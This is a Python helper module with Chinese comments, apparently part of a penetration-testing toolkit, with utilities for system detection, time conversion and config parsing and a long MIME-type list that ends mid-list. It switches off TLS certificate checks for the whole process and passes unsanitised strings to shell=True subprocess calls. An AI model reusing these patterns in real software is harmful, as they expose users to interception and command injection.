import pdb
import chardet
import platform
import os
import re
import sys
import random
import time
import datetime
from urllib.parse import urlparse
from bs4 import BeautifulSoup
import threading
from concurrent import futures
import selenium
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning, InsecurePlatformWarning
from colorama import Fore, Style
from functools import reduce
import subprocess
import base64

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
requests.packages.urllib3.disable_warnings(InsecurePlatformWarning)

def ctrl_c_debug():
    def debug_signal_handler(signal, frame):
        import pdb
        pdb.set_trace()
    import signal
    signal.signal(signal.SIGINT, debug_signal_handler)

def get_innertext_from_html(html):
    import html2text
    h=html2text.HTML2Text()
    h.ignore_links=True
    return h.handle(html)

def beep():
    import beepy
    [beepy.beep(sound=1) for i in range(6)]
    return
    system=platform.system()
    if system=='Windows':
        import winsound
        winsound.Beep(2015, 3000)
    elif system=='Darwin':
        subprocess.Popen("say "+'d'*6,shell=True)

def say(string):
    import subprocess
    try:
        system=platform.system()
        if system=='Windows':
            import win32com.client
            speak = win32com.client.Dispatch('SAPI.SPVOICE')
            speak.Speak(string)
        elif system=='Darwin':
            subprocess.Popen("say "+string,shell=True)
    except:
        print("say函数调用失败,这是正常现象,有时会失败,可忽略")

def get_localtime_from_unixtime(timestamp):
    time_local = time.localtime(int(timestamp))
    #转换成新的时间格式(2016-05-05 20:28:54)
    dt = time.strftime("%Y-%m-%d %H:%M:%S", time_local)
    return dt

def get_unixtime_from_localtime(localtime):
    timeArray = time.strptime(localtime, "%Y-%m-%d %H:%M:%S")
    timestamp = int(time.mktime(timeArray))
    return timestamp


def get_string_from_command(command):
    # 不能执行which nihao,这样不会有输出,可nihao得到输出
    # 执行成功的命令有正常输出,执行不成功的命令得不到输出,得到输出为"",eg.command=which nihao
    # 判断程序有没有已经安装可eg.get_string_from_command("sqlmap --help")
    return subprocess.getstatusoutput(command)[1]

# platform.system()为操作系统种类,x86orx64为系统位数
#"Linux,Darwin,Windows"
def get_system_bits():
    # return 64 or 32,type is int.
    x86orx64 = 0
    if platform.system() in ["Linux", "Darwin"]:
        a = get_string_from_command("uname -a")
        if re.search(r"x86_64", a):
            x86orx64 = 64
        else:
            x86orx64 = 32
    elif platform.system() == "Windows":
        if os.path.exists("c:\\Program Files(x86)"):
            x86orx64 = 64
        else:
            x86orx64 = 32
    return x86orx64


def module_exist(module_name):
    # 检测python模块是否已经安装
    # 有则返回True
    # 无则返回False
    import re
    import sys
    out = get_string_from_command('''python3 -c "help('%s');"''' % module_name)
    a = get_string_from_command("python3 --help")
    if platform.system() in ["Linux", "Darwin"]:
        if re.search(r"not found", a, re.I):
            print("Attention! I can not find `python3` in path,may be you didn't install it or didn't add it to PATH")
            sys.exit(1)
    else:
        # 由于windows下的python3默#认文件名为python.exe,如果直接改成python3.exe会导致pip3安装模块找不到pip3认为的
        # python.exe,于是在windows中使用本模块要求在python.exe同目录下将python.exe复制成python3.exe,两者保留
        if re.search(r"不是内部或外部命令", a, re.I):
            print("Attention! I can not find `python3` in path,may be you didn't install it or didn't add it to PATH")
            print("请确保在python.exe目录下将python.exe复制成python3.exe,并保留两者")
            sys.exit(1)
    if re.search(r"No Python documentation found for '%s'" % module_name, out, re.I):
        return False
    else:
        return True


if sys.version_info >= (2, 7, 9):
    import ssl
    ssl._create_default_https_context = ssl._create_unverified_context

if sys.version_info <= (3, 0, 0):
    print("sorry,this module works on python3")
    sys.exit(0)


def get_module_path():
    # 得到当前文件的路径
    tmp_path = os.path.abspath(__file__)
    module_path = tmp_path[:-len(__file__.split("/")[-1])]
    return module_path


def get_home_path():
    # python在os.path.exists("~")时不认识~目录,于是写出这个函数
    # open("~/.zshrc")函数也不认识~
    # 但是os.system认识~,可能只有os.system认识
    # 也即操作系统认识~,但是python不认识~
    # mac_o_s下的~是/var/root,ubuntu下的~是/root
    # 返回~目录的具体值,eg./var/root
    #a=get_string_from_command("cd ~ && pwd")
    # 后来发现os.path.expanduser函数可以认识~
    system = platform.system()
    if system == "Windows":
        # eg. c:\\users\\administrator
        return get_string_from_command("echo %HOMEDRIVE%%HOMEPATH%")
    else:
        return os.path.expanduser("~")


HOME_PATH = get_home_path()
ModulePath = get_module_path()
WORK_PATH = os.getcwd()


RESOURCE_FILE_PATTERN = re.compile(r"^http.*(\.(jpg)|(chm)|(jar)|(jpeg)|(gif)|(ico)|(bak)|(png)|\
(bmp)|(txt)|(doc)|(docx)|(pdf)|(txt)|(xls)|(xlsx)|(rar)|(zip)|(avi)|(mp4)|(rmvb)|(flv)|\
(m3u)|(msi)|(exe)|(com)|(pif)|(mp3)|(wav)|(mkv)|(7z)|(gz)|(htaccess)|(ini)|(xml)|(key)|\
(dll)|(css)|(cab)|(bin)|(svg)|(js))$", re.I)


def get_key_value_from_config_file(file, section, key_name):
    import re
    with open(file, "r+") as f:
        content = f.read()
    if not re.search(r"%", content, re.I) and not re.search(r"(:.*=)|(=.*:)", content, re.I):
        import configparser
        config = configparser.ConfigParser()
        config.read(file)
        value = config.get(section, key_name)
        return value
    else:
        # configparser的bug,无法读写'%'
        find = re.search(r"\[%s\]\n+(.+\n+)*%s[^\n\S]*\=[^\n\S]*(.*)" %
                         (section.replace(".", "\."), key_name), content)
        if find:
            return find.group(2)
        else:
            print("can not find %s's value in section:%s" %
                  (key_name, section))
            return None


# 常见非web服务端口
COMMON_NOT_WEB_PORT_LIST = ['21', '22', '53', '137',
                            '139', '145', '445', '1433', '3306', '3389']

CONTENT_TYPE_LIST=['xxx/xxx','application/vnd.lotus-1-2-3', 'text/vnd.in3d.3dml', 'image/x-3ds', 'video/3gpp2', 'video/3gpp', 'application/x-7z-compressed', 'application/x-authorware-bin', 'audio/x-aac', 'application/x-authorware-map', 'application/x-authorware-seg', 'audio/x-mpeg', 'application/x-abiword', 'application/pkix-attr-cert', 'application/vnd.americandynamics.acc', 'application/x-ace-compressed', 'application/vnd.acucobol', 'application/vnd.acucorp', 'audio/adpcm', 'application/vnd.audiograph', 'application/x-font-type1', 'application/vnd.ibm.modcap', 'application/vnd.ahead.space', 'application/postscript', 'audio/x-aiff', 'audio/x-aiff', 'audio/x-aiff', 'application/x-aim', 'application/vnd.adobe.air-application-installer-package+zip', 'application/vnd.dvb.ait', 'application/vnd.amiga.ami', 'application/annodex', 'application/vnd.android.package-archive', 'text/cache-manifest', 'application/x-ms-application', 'application/vnd.lotus-approach', 'application/x-freearc', 'image/x-jg', 'application/pgp-signature', 'video/x-ms-asf', 'text/x-asm', 'application/vnd.accpac.simply.aso', 'video/x-ms-asf', 'application/vnd.acucorp', 'application/atom+xml', 'application/atomcat+xml', 'application/atomsvc+xml', 'application/vnd.antix.game-component', 'audio/basic', 'video/x-msvideo', 'video/x-rad-screenplay', 'application/applixware', 'audio/annodex', 'video/annodex', 'application/vnd.airzip.filesecure.azf', 'application/vnd.airzip.filesecure.azs', 'application/vnd.amazon.ebook', 'application/x-msdownload', 'application/x-bcpio', 'application/x-font-bdf', 'application/vnd.syncml.dm+wbxml', 'application/vnd.realvnc.bed', 'application/vnd.fujitsu.oasysprs', 'application/octet-stream', 'application/x-blorb', 'application/x-blorb', 'application/vnd.bmi', 'image/bmp', 'text/html', 'application/vnd.framemaker', 'application/vnd.previewsystems.box', 'application/x-bzip2', 'application/octet-stream', 'image/prs.btif', 'application/x-bzip', 'application/x-bzip2', 'text/x-c', 'application/vnd.cluetrust.cartomobile-config', 'application/vnd.cluetrust.cartomobile-config-pkg', 'application/vnd.clonk.c4group', 'application/vnd.clonk.c4group', 'application/vnd.clonk.c4group', 'application/vnd.clonk.c4group', 'application/vnd.clonk.c4group', 'application/vnd.ms-cab-compressed', 'audio/x-caf', 'application/vnd.tcpdump.pcap', 'application/vnd.curl.car', 'application/vnd.ms-pki.seccat', 'application/x-cbr', 'application/x-cbr', 'application/x-cbr', 'application/x-cbr', 'application/x-cbr', 'text/x-c', 'application/x-director', 'application/ccxml+xml', 'application/vnd.contact.cmsg', 'application/x-cdf', 'application/vnd.mediastation.cdkey', 'application/cdmi-capability', 'application/cdmi-container', 'application/cdmi-domain', 'application/cdmi-object', 'application/cdmi-queue', 'chemical/x-cdx', 'application/vnd.chemdraw+xml', 'application/vnd.cinderella', 'application/pkix-cert', 'application/x-cfs-compressed', 'image/cgm', 'application/x-chat', 'application/vnd.ms-htmlhelp', 'application/vnd.kde.kchart', 'chemical/x-cif', 'application/vnd.anser-web-certificate-issue-initiation', 'application/vnd.ms-artgalry', 'application/vnd.claymore', 'application/java', 'application/vnd.crick.clicker.keyboard', 'application/vnd.crick.clicker.palette', 'application/vnd.crick.clicker.template', 'application/vnd.crick.clicker.wordbank', 'application/vnd.crick.clicker', 'application/x-msclip', 'application/vnd.cosmocaller', 'chemical/x-cmdf', 'chemical/x-cml', 'application/vnd.yellowriver-custom-menu', 'image/x-cmx', 'application/vnd.rim.cod', 'application/x-msdownload', 'text/plain', 'application/x-cpio', 'text/x-c', 'application/mac-compactpro', 'application/x-mscardfile', 'application/pkix-crl', 'application/x-x509-ca-cert', 'application/vnd.rig.cryptonote', 'application/x-csh', 'chemical/x-csml', 'application/vnd.commonspace', 'text/css', 'application/x-director', 'text/csv', 'application/cu-seeme', 'text/vnd.curl', 'application/prs.cww', 'application/x-director', 'text/x-c', 'model/vnd.collada+xml', 'application/vnd.mobius.daf', 'application/vnd.dart', 'application/vnd.fdsn.seed', 'application/davmount+xml', 'application/docbook+xml', 'application/x-director', 'text/vnd.curl.dcurl', 'application/vnd.oma.dd2+xml', 'application/vnd.fujixerox.ddd', 'application/x-debian-package', 'text/plain', 'application/octet-stream', 'application/x-x509-ca-cert', 'application/vnd.dreamfactory', 'application/x-dgc-compressed', 'image/bmp', 'text/x-c', 'application/x-director', 'application/vnd.mobius.dis', 'application/octet-stream', 'application/octet-stream', 'image/vnd.djvu', 'image/vnd.djvu', 'application/x-msdownload', 'application/x-apple-diskimage', 'application/vnd.tcpdump.pcap', 'application/octet-stream', 'application/vnd.dna', 'application/msword', 'application/vnd.ms-word.document.macroenabled.12', 'application/vnd.openxmlformats-officedocument.wordprocessingml.document', 'application/msword', 'application/vnd.ms-word.template.macroenabled.12', 'application/vnd.openxmlformats-officedocument.wordprocessingml.template', 'application/vnd.osgi.dp', 'application/vnd.dpgraph', 'audio/vnd.dra', 'text/prs.lines.tag', 'application/dssc+der', 'application/x-dtbook+xml', 'application/xml-dtd', 'audio/vnd.dts', 'audio/vnd.dts.hd', 'application/octet-stream', 'video/x-dv', 'video/vnd.dvb.file', 'application/x-dvi', 'model/vnd.dwf', 'image/vnd.dwg', 'image/vnd.dxf', 'application/vnd.spotfire.dxp', 'application/x-director', 'audio/vnd.nuera.ecelp4800', 'audio/vnd.nuera.ecelp7470', 'audio/vnd.nuera.ecelp9600', 'application/ecmascript', 'application/vnd.novadigm.edm', 'application/vnd.novadigm.edx', 'application/vnd.picsel', 'application/vnd.pg.osasli', 'application/octet-stream', 'application/x-msmetafile', 'message/rfc822', 'application/emma+xml', 'application/x-msmetafile', 'audio/vnd.digital-winds', 'application/vnd.ms-fontobject', 'application/postscript', 'application/epub+zip', 'application/vnd.eszigno3+xml', 'application/vnd.osgi.subsystem', 'application/vnd.epson.esf', 'application/vnd.eszigno3+xml', 'text/x-setext', 'application/x-eva', 'application/x-envoy', 'application/octet-stream', 'application/exi', 'application/vnd.novadigm.ext', 'application/andrew-inset', 'application/vnd.ezpix-album', 'application/vnd.ezpix-package', 'text/x-fortran', 'video/x-f4v', 'text/x-fortran', 'text/x-fortran', 'image/vnd.fastbidsheet', 'application/vnd.adobe.formscentral.fcdt', 'application/vnd.isac.fcs', 'application/vnd.fdf', 'application/vnd.denovo.fcselayout-link', 'application/vnd.fujitsu.oasysgp', 'application/x-director', 'image/x-freehand', 'image/x-freehand', 'image/x-freehand', 'image/x-freehand', 'image/x-freehand', 'application/x-xfig', 'audio/flac', 'video/x-fli', 'application/vnd.micrografx.flo', 'video/x-flv', 'application/vnd.kde.kivio', 'text/vnd.fmi.flexstor', 'text/vnd.fly', 'application/vnd.framemaker', 'application/vnd.frogans.fnc', 'text/x-fortran', 'image/vnd.fpx', 'application/vnd.framemaker', 'application/vnd.fsc.weblaunch', 'image/vnd.fst', 'application/vnd.fluxtime.clip', 'application/vnd.anser-web-funds-transfer-initiation', 'video/vnd.fvt', 'application/vnd.adobe.fxp', 'application/vnd.adobe.fxp', 'application/vnd.fuzzysheet', 'application/vnd.geoplan', 'image/g3fax', 'application/vnd.geospace', 'application/vnd.groove-account', 'application/x-tads', 'application/rpki-ghostbusters', 'application/x-gca-compressed', 'model/vnd.gdl', 'application/vnd.dynageo', 'application/vnd.geometry-explorer', 'application/vnd.geogebra.file', 'application/vnd.geogebra.tool', 'application/vnd.groove-help', 'image/gif', 'application/vnd.groove-identity-message', 'application/gml+xml', 'application/vnd.gmx', 'application/x-gnumeric', 'application/vnd.flographit', 'application/gpx+xml', 'application/vnd.grafeq', 'application/vnd.grafeq', 'application/srgs', 'application/x-gramps-xml', 'application/vnd.geometry-explorer', 'application/vnd.groove-injector', 'application/srgs+xml', 'application/x-font-ghostscript', 'application/x-gtar', 'application/vnd.groove-tool-message', 'model/vnd.gtw', 'text/vnd.graphviz', 'application/gxf', 'application/vnd.geonext', 'application/x-gzip', 'text/x-c', 'video/h261', 'video/h263', 'video/h264', 'application/vnd.hal+xml', 'application/vnd.hbci', 'application/x-hdf', 'text/x-c', 'application/winhlp', 'application/vnd.hp-hpgl', 'application/vnd.hp-hpid', 'application/vnd.hp-hps', 'application/mac-binhex40', 'text/x-component', 'application/vnd.kenameaapp', 'text/html', 'text/html', 'application/vnd.yamaha.hv-dic', 'application/vnd.yamaha.hv-voice', 'application/vnd.yamaha.hv-script', 'application/vnd.intergeo', 'application/vnd.iccprofile', 'x-conference/x-cooltalk', 'application/vnd.iccprofile', 'image/x-icon', 'text/calendar', 'image/ief', 'text/calendar', 'application/vnd.shana.informed.formdata', 'model/iges', 'application/vnd.igloader', 'application/vnd.insors.igm', 'model/iges', 'application/vnd.micrografx.igx', 'application/vnd.shana.informed.interchange', 'application/vnd.accpac.simply.imp', 'application/vnd.ms-ims', 'text/plain', 'application/inkml+xml', 'application/inkml+xml', 'application/x-install-instructions', 'application/vnd.astraea-software.iota', 'application/ipfix', 'application/vnd.shana.informed.package', 'application/vnd.ibm.rights-management', 'application/vnd.irepository.package+xml', 'application/x-iso9660-image', 'application/vnd.shana.informed.formtemplate', 'application/vnd.immervision-ivp', 'application/vnd.immervision-ivu', 'text/vnd.sun.j2me.app-descriptor', 'application/vnd.jam', 'application/java-archive', 'text/x-java-source', 'application/vnd.jisp', 'application/vnd.hp-jlyt', 'application/x-java-jnlp-file', 'application/vnd.joost.joda-archive', 'image/jpeg', 'image/jpeg', 'image/jpeg', 'video/jpm', 'video/jpeg', 'video/jpm', 'application/javascript', 'text/plain', 'application/json', 'application/jsonml+json', 'text/plain', 'audio/midi', 'application/vnd.kde.karbon', 'application/vnd.kde.kformula', 'application/vnd.kidspiration', 'application/vnd.google-earth.kml+xml', 'application/vnd.google-earth.kmz', 'application/vnd.kinar', 'application/vnd.kinar', 'application/vnd.kde.kontour', 'application/vnd.kde.kpresenter', 'application/vnd.kde.kpresenter', 'application/vnd.ds-keypoint', 'application/vnd.kde.kspread', 'application/vnd.kahootz', 'image/ktx', 'application/vnd.kahootz', 'application/vnd.kde.kword', 'application/vnd.kde.kword', 'application/vnd.las.las+xml', 'application/x-latex', 'application/vnd.llamagraphics.life-balance.desktop', 'application/vnd.llamagraphics.life-balance.exchange+xml', 'application/vnd.hhe.lesson-player', 'application/x-lzh-compressed', 'application/vnd.route66.link66+xml', 'text/plain', 'application/vnd.ibm.modcap', 'application/vnd.ibm.modcap', 'application/x-ms-shortcut', 'text/plain', 'application/lost+xml', 'application/octet-stream', 'application/vnd.ms-lrm', 'application/vnd.frogans.ltf', 'audio/vnd.lucent.voice', 'application/vnd.lotus-wordpro', 'application/x-lzh-compressed', 'application/x-msmediaview', 'application/x-msmediaview', 'video/mpeg', 'application/mp21', 'audio/mpeg', 'video/mpeg', 'audio/mpeg', 'audio/x-mpegurl', 'application/vnd.apple.mpegurl', 'audio/mp4', 'audio/mp4', 'audio/mp4', 'video/vnd.mpegurl', 'video/mp4', 'application/mathematica', 'image/x-macpaint', 'application/mads+xml', 'application/vnd.ecowin.chart', 'application/vnd.framemaker', 'text/troff', 'application/octet-stream', 'application/mathml+xml', 'application/mathematica', 'application/vnd.mobius.mbk', 'application/mbox', 'application/vnd.medcalcdata', 'application/vnd.mcd', 'text/vnd.curl.mcurl', 'application/x-msaccess', 'image/vnd.ms-modi', 'text/troff', 'model/mesh', 'application/metalink4+xml', 'application/metalink+xml', 'application/mets+xml', 'application/vnd.mfmp', 'application/rpki-manifest', 'application/vnd.osgeo.mapguide.package', 'application/vnd.proteus.magazine', 'audio/midi', 'audio/midi', 'application/x-mie', 'application/x-mif', 'message/rfc822', 'video/mj2', 'video/mj2', 'video/x-matroska', 'audio/x-matroska', 'video/x-matroska', 'video/x-matroska', 'application/vnd.dolby.mlp', 'application/vnd.chipnuts.karaoke-mmd', 'application/vnd.smaf', 'image/vnd.fujixerox.edmics-mmr', 'video/x-mng', 'application/x-msmoney', 'application/x-mobipocket-ebook', 'application/mods+xml', 'video/quicktime', 'video/x-sgi-movie', 'audio/mpeg', 'audio/mpeg', 'application/mp21', 'audio/mpeg', 'audio/mpeg', 'video/mp4', 'audio/mp4', 'application/mp4', 'video/mp4', 'audio/mpeg', 'application/vnd.mophun.certificate', 'video/mpeg', 'video/mpeg', 'audio/x-mpeg', 'video/mpeg', 'video/mp4', 'audio/mpeg', 'application/vnd.apple.installer+xml', 'application/vnd.blueice.multipass', 'application/vnd.mophun.application', 'application/vnd.ms-project', 'application/vnd.ms-project', 'video/mpeg2', 'application/vnd.ibm.minipay', 'application/vnd.mobius.mqy', 'application/marc', 'application/marcxml+xml', 'text/troff', 'application/mediaservercontrol+xml', 'application/vnd.fdsn.mseed', 'application/vnd.mseq', 'application/vnd.epson.msf', 'model/mesh', 'application/x-msdownload', 'application/vnd.mobius.msl', 'application/vnd.muvee.style', 'model/vnd.mts', 'application/vnd.musician', 'application/vnd.recordare.musicxml+xml', 'application/x-msmediaview', 'application/vnd.mfer', 'application/mxf', 'application/vnd.recordare.musicxml', 'application/xv+xml', 'application/vnd.triscape.mxs', 'video/vnd.mpegurl', 'application/vnd.nokia.n-gage.symbian.install', 'text/n3', 'application/mathematica', 'application/vnd.wolfram.player', 'application/x-netcdf', 'application/x-dtbncx+xml', 'text/x-nfo', 'application/vnd.nokia.n-gage.data', 'application/vnd.nitf', 'application/vnd.neurolanguage.nlu', 'application/vnd.enliven', 'application/vnd.noblenet-directory', 'application/vnd.noblenet-sealer', 'application/vnd.noblenet-web', 'image/vnd.net-fpx', 'application/x-conference', 'application/vnd.lotus-notes', 'application/vnd.nitf', 'application/x-nzb', 'application/vnd.fujitsu.oasys2', 'application/vnd.fujitsu.oasys3', 'application/vnd.fujitsu.oasys', 'application/x-msbinder', 'application/x-tgif', 'application/oda', 'application/vnd.oasis.opendocument.database', 'application/vnd.oasis.opendocument.chart', 'application/vnd.oasis.opendocument.formula', 'application/vnd.oasis.opendocument.formula-template', 'application/vnd.oasis.opendocument.graphics', 'application/vnd.oasis.opendocument.image', 'application/vnd.oasis.opendocument.text-master', 'application/vnd.oasis.opendocument.presentation', 'application/vnd.oasis.opendocument.spreadsheet', 'application/vnd.oasis.opendocument.text', 'audio/ogg', 'audio/ogg', 'video/ogg', 'application/ogg', 'application/omdoc+xml', 'application/onenote', 'application/onenote', 'application/onenote', 'application/onenote', 'application/oebps-package+xml', 'text/x-opml', 'application/vnd.palm', 'application/vnd.lotus-organizer', 'application/vnd.yamaha.openscoreformat', 'application/vnd.yamaha.openscoreformat.osfpvg+xml', 'application/vnd.oasis.opendocument.chart-template', 'application/x-font-otf', 'application/vnd.oasis.opendocument.graphics-template', 'application/vnd.oasis.opendocument.text-web', 'application/vnd.oasis.opendocument.image-template', 'application/vnd.oasis.opendocument.presentation-template', 'application/vnd.oasis.opendocument.spreadsheet-template', 'application/vnd.oasis.opendocument.text-template', 'application/oxps', 'application/vnd.openofficeorg.extension', 'text/x-pascal', 'application/pkcs10', 'application/x-pkcs12', 'application/x-pkcs7-certificates', 'application/pkcs7-mime', 'application/pkcs7-mime', 'application/x-pkcs7-certreqresp', 'application/pkcs7-signature', 'application/pkcs8', 'text/x-pascal', 'application/vnd.pawaafile', 'application/vnd.powerbuilder6', 'image/x-portable-bitmap', 'application/vnd.tcpdump.pcap', 'application/x-font-pcf', 'application/vnd.hp-pcl', 'application/vnd.hp-pclxl', 'image/pict', 'application/vnd.curl.pcurl', 'image/x-pcx', 'application/vnd.palm', 'application/pdf', 'application/x-font-type1', 'application/x-font-type1', 'application/x-font-type1', 'application/font-tdpfr', 'application/x-pkcs12', 'image/x-portable-graymap', 'application/x-chess-pgn', 'application/pgp-encrypted', 'image/pict', 'image/pict', 'application/octet-stream', 'application/pkixcmp', 'application/pkix-pkipath', 'application/vnd.3gpp.pic-bw-large', 'application/vnd.mobius.plc', 'application/vnd.pocketlearn', 'audio/x-scpls', 'application/vnd.ctc-posml', 'image/png', 'image/x-portable-anymap', 'image/x-macpaint', 'application/vnd.macports.portpkg', 'application/vnd.ms-powerpoint', 'application/vnd.ms-powerpoint.template.macroenabled.12', 'application/vnd.openxmlformats-officedocument.presentationml.template', 'application/vnd.ms-powerpoint.addin.macroenabled.12', 'application/vnd.cups-ppd', 'image/x-portable-pixmap', 'application/vnd.ms-powerpoint', 'application/vnd.ms-powerpoint.slideshow.macroenabled.12', 'application/vnd.openxmlformats-officedocument.presentationml.slideshow', 'application/vnd.ms-powerpoint', 'application/vnd.ms-powerpoint.presentation.macroenabled.12', 'application/vnd.openxmlformats-officedocument.presentationml.presentation', 'application/vnd.palm', 'application/x-mobipocket-ebook', 'application/vnd.lotus-freelance', 'application/pics-rules', 'application/postscript', 'application/vnd.3gpp.pic-bw-small', 'image/vnd.adobe.photoshop', 'application/x-font-linux-psf', 'application/pskc+xml', 'application/vnd.pvi.ptid1', 'application/x-mspublisher', 'application/vnd.3gpp.pic-bw-var', 'application/vnd.3m.post-it-notes', 'audio/vnd.ms-playready.media.pya', 'video/vnd.ms-playready.media.pyv', 'application/vnd.epson.quickanime', 'application/vnd.intu.qbo', 'application/vnd.intu.qfx', 'application/vnd.publishare-delta-tree', 'video/quicktime', 'image/x-quicktime', 'image/x-quicktime', 'application/vnd.quark.quarkxpress', 'application/vnd.quark.quarkxpress', 'application/vnd.quark.quarkxpress', 'application/vnd.quark.quarkxpress', 'application/vnd.quark.quarkxpress', 'application/vnd.quark.quarkxpress', 'audio/x-pn-realaudio', 'audio/x-pn-realaudio', 'application/x-rar-compressed', 'image/x-cmu-raster', 'application/vnd.ipunplugged.rcprofile', 'application/rdf+xml', 'application/vnd.data-vision.rdz', 'application/vnd.businessobjects', 'application/x-dtbresource+xml', 'image/x-rgb', 'application/reginfo+xml', 'audio/vnd.rip', 'application/x-research-info-systems', 'application/resource-lists+xml', 'image/vnd.fujixerox.edmics-rlc', 'application/resource-lists-diff+xml', 'application/vnd.rn-realmedia', 'audio/midi', 'audio/x-pn-realaudio-plugin', 'application/vnd.jcp.javame.midlet-rms', 'application/vnd.rn-realmedia-vbr', 'application/relax-ng-compact-syntax', 'application/rpki-roa', 'text/troff', 'application/vnd.cloanto.rp9', 'application/vnd.nokia.radio-presets', 'application/vnd.nokia.radio-preset', 'application/sparql-query', 'application/rls-services+xml', 'application/rsd+xml', 'application/rss+xml', 'application/rtf', 'text/richtext', 'text/x-asm', 'audio/s3m', 'application/vnd.yamaha.smaf-audio', 'application/sbml+xml', 'application/vnd.ibm.secure-container', 'application/x-msschedule', 'application/vnd.lotus-screencam', 'application/scvp-cv-request', 'application/scvp-cv-response', 'text/vnd.curl.scurl', 'application/vnd.stardivision.draw', 'application/vnd.stardivision.calc', 'application/vnd.stardivision.impress', 'application/vnd.solent.sdkm+xml', 'application/vnd.solent.sdkm+xml', 'application/sdp', 'application/vnd.stardivision.writer', 'application/vnd.seemail', 'application/vnd.fdsn.seed', 'application/vnd.sema', 'application/vnd.semd', 'application/vnd.semf', 'application/java-serialized-object', 'application/set-payment-initiation', 'application/set-registration-initiation', 'application/vnd.hydrostatix.sof-data', 'application/vnd.spotfire.sfs', 'text/x-sfv', 'image/sgi', 'application/vnd.stardivision.writer-global', 'text/sgml', 'text/sgml', 'application/x-sh', 'application/x-shar', 'application/shf+xml', 'image/x-mrsid-image', 'application/pgp-signature', 'audio/silk', 'model/mesh', 'application/vnd.symbian.install', 'application/vnd.symbian.install', 'application/x-stuffit', 'application/x-stuffitx', 'application/vnd.koan', 'application/vnd.koan', 'application/vnd.koan', 'application/vnd.koan', 'application/vnd.ms-powerpoint.slide.macroenabled.12', 'application/vnd.openxmlformats-officedocument.presentationml.slide', 'application/vnd.epson.salt', 'application/vnd.stepmania.stepchart', 'application/vnd.stardivision.math', 'application/smil+xml', 'application/smil+xml', 'video/x-smv', 'application/vnd.stepmania.package', 'audio/basic', 'application/x-font-snf', 'application/octet-stream', 'application/x-pkcs7-certificates', 'application/vnd.yamaha.smaf-phrase', 'application/x-futuresplash', 'text/vnd.in3d.spot', 'application/scvp-vp-response', 'application/scvp-vp-request', 'audio/ogg', 'application/x-sql', 'application/x-wais-source', 'application/x-subrip', 'application/sru+xml', 'application/sparql-results+xml', 'application/ssdl+xml', 'application/vnd.kodak-descriptor', 'application/vnd.epson.ssf', 'application/ssml+xml', 'application/vnd.sailingtracker.track', 'application/vnd.sun.xml.calc.template', 'application/vnd.sun.xml.draw.template', 'application/vnd.wt.stf', 'application/vnd.sun.xml.impress.template', 'application/hyperstudio', 'application/vnd.ms-pki.stl', 'application/vnd.pg.format', 'application/vnd.sun.xml.writer.template', 'text/vnd.dvb.subtitle', 'application/vnd.sus-calendar', 'application/vnd.sus-calendar', 'application/x-sv4cpio', 'application/x-sv4crc', 'application/vnd.dvb.service', 'application/vnd.svd', 'image/svg+xml', 'image/svg+xml', 'application/x-director', 'application/x-shockwave-flash', 'application/vnd.aristanetworks.swi', 'application/vnd.sun.xml.calc', 'application/vnd.sun.xml.draw', 'application/vnd.sun.xml.writer.global', 'application/vnd.sun.xml.impress', 'application/vnd.sun.xml.math', 'application/vnd.sun.xml.writer', 'text/troff', 'application/x-t3vm-image', 'application/vnd.mynfc', 'application/vnd.tao.intent-module-archive', 'application/x-tar', 'application/vnd.3gpp2.tcap', 'application/x-tcl', 'application/vnd.smart.teacher', 'application/tei+xml', 'application/tei+xml', 'application/x-tex', 'application/x-texinfo', 'application/x-texinfo', 'text/plain', 'application/thraud+xml', 'application/x-tex-tfm', 'image/x-tga', 'application/vnd.ms-officetheme', 'image/tiff', 'image/tiff', 'application/vnd.tmobile-livetv', 'application/x-bittorrent', 'application/vnd.groove-tool-template', 'application/vnd.trid.tpt', 'text/troff', 'application/vnd.trueapp', 'application/x-msterminal', 'application/timestamped-data', 'text/tab-separated-values', 'application/x-font-ttf', 'application/x-font-ttf', 'text/turtle', 'application/vnd.simtech-mindmapper', 'application/vnd.simtech-mindmapper', 'application/vnd.genomatix.tuxedo', 'application/vnd.mobius.txf', 'text/plain', 'application/x-authorware-bin', 'application/x-debian-package', 'application/vnd.ufdl', 'application/vnd.ufdl', 'audio/basic', 'application/x-glulx', 'application/vnd.umajin', 'application/vnd.unity', 'application/vnd.uoml+xml', 'text/uri-list', 'text/uri-list', 'text/uri-list', 'application/x-ustar', 'application/vnd.uiq.theme', 'text/x-uuencode', 'audio/vnd.dece.audio', 'application/vnd.dece.data', 'application/vnd.dece.data', 'image/vnd.dece.graphic', 'video/vnd.dece.hd', 'image/vnd.dece.graphic', 'video/vnd.dece.mobile', 'video/vnd.dece.pd', 'video/vnd.dece.sd', 'application/vnd.dece.ttml+xml', 'video/vnd.uvvu.mp4', 'video/vnd.dece.video', 'audio/vnd.dece.audio', 'application/vnd.dece.data', 'application/vnd.dece.data', 'image/vnd.dece.graphic', 'video/vnd.dece.hd', 'image/vnd.dece.graphic', 'video/vnd.dece.mobile', 'video/vnd.dece.pd', 'video/vnd.dece.sd', 'application/vnd.dece.ttml+xml', 'video/vnd.uvvu.mp4', 'video/vnd.dece.video', 'application/vnd.dece.unspecified', 'application/vnd.dece.zip', 'application/vnd.dece.unspecified', 'application/vnd.dece.zip', 'text/vcard', 'application/x-cdlink', 'text/x-vcard', 'application/vnd.groove-vcard', 'text/x-vcalendar', 'application/vnd.vcx', 'application/vnd.visionary', 'video/vnd.vivo', 'video/x-ms-vob', 'application/vnd.stardivision.writer', 'application/x-authorware-bin', 'model/vrml', 'application/vnd.visio', 'application/vnd.vsf', 'application/vnd.visio', 'application/vnd.visio', 'application/vnd.visio', 'model/vnd.vtu', 'application/voicexml+xml', 'application/x-director', 'application/x-doom', 'audio/x-wav', 'audio/x-ms-wax', 'image/vnd.wap.wbmp', 'application/vnd.criticaltools.wbs+xml', 'application/vnd.wap.wbxml', 'application/vnd.ms-works', 'application/vnd.ms-works', 'image/vnd.ms-photo', 'audio/webm', 'video/webm', 'image/webp', 'application/vnd.pmi.widget', 'application/widget', 'application/vnd.ms-works', 'video/x-ms-wm', 'audio/x-ms-wma', 'application/x-ms-wmd', 'application/x-msmetafile', 'text/vnd.wap.wml', 'application/vnd.wap.wmlc', 'text/vnd.wap.wmlscript', 'application/vnd.wap.wmlscriptc', 'video/x-ms-wmv', 'video/x-ms-wmx', 'application/x-msmetafile', 'application/x-font-woff', 'application/vnd.wordperfect', 'application/vnd.ms-wpl', 'application/vnd.ms-works', 'application/vnd.wqd', 'application/x-mswrite', 'model/vrml', 